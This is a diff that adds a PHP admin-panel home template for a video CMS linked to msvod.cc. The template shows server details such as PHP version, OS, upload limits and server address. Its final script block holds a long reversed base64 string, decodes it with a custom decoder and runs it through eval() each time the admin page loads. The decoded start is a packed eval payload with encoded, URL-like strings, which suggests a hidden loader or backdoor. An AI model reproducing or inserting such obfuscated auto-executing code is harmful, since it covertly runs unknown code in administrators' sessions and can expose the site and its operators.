@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="gbk">
+<title><?=L('admin_title')?></title>
+<meta name="robots" content="noindex,nofollow">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<link type="text/css" rel="stylesheet" href="<?=Web_Path?>packs/admin/css/style.css" />
+<script type="text/javascript" src="<?=Web_Path?>packs/admin/js/jquery-min.js"></script>
+<script type="text/javascript" src="<?=Web_Path?>packs/admin/js/common.js"></script>
+ 
+</head>
+<body>
+<div class="place">
+<span><?=L('place')?></span>
+<ul class="placeul"><li><a href="#"><?=L('home')?></a></li></ul>
+</div>
+<div class="mainindex">
+<!--div class="welinfo">
+<span><img src="<?=Web_Path?>packs/admin/images/sun.png"/></span>
+<b><?=$_SESSION['admin_name']?>
+<?php
+if(date('H')<9){
+echo L('main-01');
+}elseif(date('H')<12){
+echo L('main-02');
+}elseif(date('H')<18){
+echo L('main-03');
+}else{
+echo L('main-04');
+}
+?> ，<?=L('main-05')?></b>
+</div>
+<div class="welinfo">
+<span><img src="<?=Web_Path?>packs/admin/images/time.png" alt="<?=L('main-06')?>"/></span>
+<i><?=L('main-07').$_SESSION['admin_logtime']?></i> 
+<i><?=L('main-08').$_SESSION['admin_logip']?>/<?=$this->ip->address($_SESSION['admin_logip'])?></i>
+</div>
+<div class="xline"></div>
+<div class="box"></div-->
+<div class="welinfo">
+<span><img src="<?=Web_Path?>packs/admin/images/dp.png"/></span>
+<b><?=L('main-09')?></b>
+</div>
+<div class="xline"></div>
+<div class="box"></div>
+<ul class="infolist">
+<li><span class="left"><?=L('main-10')?></span><span class="right"><a href="http://www.msvod.cc/" style="color:#000;" target="_blank"><?=L('main-11')?></a></span></li>
+<li><span class="left"><?=L('main-12')?></span><span class="right">(=>5.0)：<?php $PHPALL=explode(".",PHP_VERSION); if($PHPALL[1] < 1 && $PHPALL[1] < 2){ echo '<font color=red>×</font>';}else{ echo '<font color=#0076AE>√</font>';}?>&nbsp;&nbsp;(<?php echo PHP_VERSION;?>)</span></li>
+<li><span class="left"><?=L('main-13')?></span><span class="right">(=>5.0)：<?php echo mydb(); ?></span></li>
+<li><span class="left"><?=L('main-14')?></span><span class="right"><?=show("upload_max_filesize")?><a href="/packs/php.ini.html" style="color:#0000ff"> <?=L('main-15')?></a></span></li>
+<li><span class="left"><?=L('main-16')?></span><span class="right"><?=show("post_max_size")?><a href="/packs/php.ini.html" style="color:#0000ff"> <?=L('main-15')?></a></span></li>
+<li><span class="left"><?=L('main-17')?></span><span class="right"><?php $os = explode(" ", php_uname()); echo $os[0];?> &nbsp;<?=L('main-18')?><?php if('/'==DIRECTORY_SEPARATOR){echo $os[2];}else{echo $os[1];} ?> /   <?php echo $_SERVER['SERVER_SOFTWARE'];?></span></li>
+<li><span class="left"><?=L('main-19')?></span><span class="right"><?php echo $_SERVER['SERVER_NAME'];?>(<?php if('/'==DIRECTORY_SEPARATOR){echo $_SERVER['SERVER_ADDR'];}else{echo @gethostbyname($_SERVER['SERVER_NAME']);} ?>)</span></li>
+<li><span class="left"><?=L('main-20')?></span><span class="right"><?=show("max_execution_time")?><a href="/packs/php.ini.html" style="color:#0000ff"> <?=L('main-15')?></a></span></li>
+</ul>
+<div class="bk20 hr"><hr></div>
+<div>
+<script language="javascript" type="text/javascript">var _1OO='=oQKpkyJ8dCK0lGbwNnLnEkR1YTd8VEN3YTd8BjMGVTd8dTNGdTd8BDOyYTd8FERChTd8ZUMEhTd8lTOGlTd8lDMGZUd8FVUFJTN1UHfBVUM4UHfmVmc8hDNxUDMzYzMyI0M8hTOCVTd8FDMzYTd8lHZvJGd8ZkM3YTd8RTMGZTd8VWbh50ZhRVeCNHduVWblxWR0V2Z8ljQ1YTd8NUO3YTd8xkUVxXNxIjM8xmc1xXZwF2YzVmb1x3YyNHdldGfwAjR1UHfxQ0M1UHfkxWaoNEZuVGcwFGflRXaydHflxmYhRHfr9GfkFWZoxHRwQTN1xXQzkzN1xHdwlmcjNHfGZjR4UHfvZmbpxXawFWeyVWdxpGfjJ3c8ZkM1YTd8NXbjNXTFNDfy9GbvNmMywHc0RHa8RENyUTd8JXZyJXZmVmc8ZjRFRTd8RWZyF0M8NTNGVTd8ZER3UTd8dmbpRGZhBHbsV2YwIDf8lHZvJGdDNDfwITMyIDfFBDN1UHfn5WajFGczxGblNGMywnM3IDO1xHMwEjMywXNEVEN1xHcvRHflxmYhR3QzwnclRmcvJGMywXM5gTO1xHMzEjMywnM2IkN1xnMGRUN1xHduVWblxWRlRXYlJ3Y8ZzQ5gTd812b0R3bix3Q4UEN1xHN4IDfwRHdoJjM8FDO5cTd8NVTDNVTFNDful2ZyFWbyIDft92Y8lDRBdTd8V2d3d3c2xnbpdmch1mQzwXMyIkN1xHduVmbvBXbvNUSSVVZk92YuVGfv1WZkx3MyIjM8BHd0hWRzwHMwIjMyw3QycjN1xHewVTQzwXZwF2YzV2X8FDMwMTd8BDM1kTd8hDOzYTd8JEMBdTd8ZEOFVTd8VEOGdTd8ZERFdTd89EMw8FfCZ0Q3UHfPBTS8NDN3YTd8N3chx2YwIDfyR3QzwXM1Y0N1xHdmVGbtJjM8d3d3xHO0IzN1xHZ0N0M8ZWZyhGMywXRyUTN1xXYDNDfr5WYsJ2XyIDf4AjRGVHf0V2ZyFGdwIDfyFmd8N2Y8Rnbl1Wdj9GZ8JHd8B3ci5mNywXQxYkR1xHa0RWa3BjM8RHanlmcyIDfudWasFGMywHZvZ3ctxHdodWalhGMywHZ0xXNyIjM8ZzMxwXZslHdzBjM8BjMywXQwwHbhZXZ8RXasB3c8VGZvNkchh2Qt9mcmxHdulUZzJXYwx3dl5Gfn5WayR3UvRHfwhXRnVmU8ZWa8dmbpJHdTxXZslGa3xXZjFGbwVmc852bpR3YuVnZ85mc1RXZyxHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHfnwiNyQDLyYDLnkSK9tHLwwSKnwFfnwFKMRjLnwVb1wXO2w3N2wnN2w3M2wHN2wXN2wXY2wnY2wHa2wXa2w3Z2wnZ2w3Y2wHZ2wXZ2wXM2wHM2wHU1w3a2wXU1w3T1wnT1w3S1wHT1wXT1wnU1w3U1wXW1wnW1wHW1w3V1wHV1wXV1wnV1wna2wnd2wXS2wHT2wHS2wHR2wXR2wnR2w3S2wnT2wnU2wXU2w3T2wXT2wHU2wnS2wnQ2wXc2wnc2wHc2w3b2wHb2wHf8xHf81mN8NkN85mN8NnN8RnN8pnN8FkN8lnN8hnN8VnN8dnN8dkN8hjN8lUN8BTN8FTN81EN8pFN8lFN8ZFN8dFN8hFN8JTN8NTN8hTN8lTN8dTN8ZTN8RTN8xHfVRDfhVDfSRDfGRDfERDfDRDfJRDfHRDfMRDfIRDfLRDfURDfTRDfORDfKRDfyYDfRRDfFRDfPRDfQRDf1UDfiVDf5VDf6VDf4VDf3VDf0VDf1VDf2VDfBVDfCVDfHVDfIVDfGVDfFVDfDVDfEVDfzVDfyVDfoVDfpVDfnVDfmVDfjVDfkVDflVDfqVDfrVDfwVDfxVDfvVDfuVDfsVDfBRDfCRDf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8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';function IOl(data){var OO0lOI="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';do{h1=OO0lOI.indexOf(data.charAt(i++));h2=OO0lOI.indexOf(data.charAt(i++));h3=OO0lOI.indexOf(data.charAt(i++));h4=OO0lOI.indexOf(data.charAt(i++));bits=h1<<18|h2<<12|h3<<6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bits&0xff;if(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fromCharCode(o1,o2,o3)}}while(i<data.length);return enc} function OO0(string){ var ret = '', i = 0;	for ( i = string.length-1; i >= 0; i-- ){ ret += string.charAt(i);} return ret; }eval(IOl(OO0(_1OO)));</script>
+</div>
+</div>
+</body>
+</html>
